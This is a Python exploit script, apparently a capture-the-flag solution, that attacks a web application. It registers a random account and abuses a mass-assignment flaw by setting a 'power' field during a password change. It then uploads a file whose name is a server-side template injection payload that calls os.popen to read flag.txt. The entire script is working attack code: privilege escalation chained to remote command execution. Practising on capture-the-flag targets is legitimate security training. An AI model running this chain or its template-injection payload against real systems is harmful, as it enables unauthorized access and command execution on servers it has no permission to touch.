import requests
import random
import string
import argparse

def random_char(y):
    return ''.join(random.choice(string.ascii_letters) for x in range(y))
   
def random_digit(y):
    return ''.join(random.choice(string.digits) for x in range(y))

def register(url, username, password):
    """
    Registers a user with the provided username and password...
    """
    data = {
           "username": username,
           "password": password,
           "first_name": random_char(10),
           "last_name": random_char(10),
           "email": random_char(5) + "@example.com",
           "phone_number": random_digit(10)
         }
    
    response = requests.post(url + "/register", json=data)
    if response.status_code == 201:
        print("\n[*] User registered successfully with username: " + username + " and password: " + password)
        return True
    return False

def login(url, username, password):
    """
    Logs in the user and returns the access token.
    """
    data = {
              "username": username,
              "password": password
            }
    response = requests.post(url + "/login", json=data)
    print("[*] Logged in successfully with username: " + username + " and password: " + password)
    return response.json()["access_token"]

def update_password(url, username, old_password, new_password, access_token):
    """
    Update the user's password and exploit the mass assignment vulnerability on power field.
    """
    data = {
        "username": username,
        "old_password": old_password,
        "new_password": new_password,
        "power": True
    }
    response = requests.patch(url + "/update_password", json=data, headers={"Authorization": "Bearer " + access_token})

def create_file(name):
    with open(name, "w") as f:
        f.write("Hello World")
    
def upload(url_api, access_token):
    # Exploit the SSTI vulnerability to read the flag.txt file payload on "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
    cmd = 'cat<flag.txt'
    payload = "{{self.__init__.__globals__.__builtins__.__import__('os').popen('" + cmd + "').read()}}"
    create_file(payload)
    files = {
        "file": open(payload, "rb")
    }
    response = requests.post(url_api + "/upload", files=files, headers={"Authorization": "Bearer " + access_token})
    return response.text.split(' ')[0]

def main(url, url_api):
    username = random_char(10)
    password = random_char(10)

    if not register(url, username, password):
        print("Failed to register user.")
        return

    access_token = login(url, username, password)

    if access_token:
        new_password = random_char(10)
        update_password(url, username, password, new_password, access_token)
        new_access_token = login(url, username, new_password)
        flag = upload(url_api, new_access_token)
        print(f"\n[*] The flag is: {flag}\n")
    else:
        print("Failed to log in.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit script with URL and API URL arguments.")
    parser.add_argument("url_app", type=str, help="URL for user registration and login")
    parser.add_argument("url_api", type=str, help="URL for file upload")
    
    args = parser.parse_args()

    main(args.url_app, args.url_api)
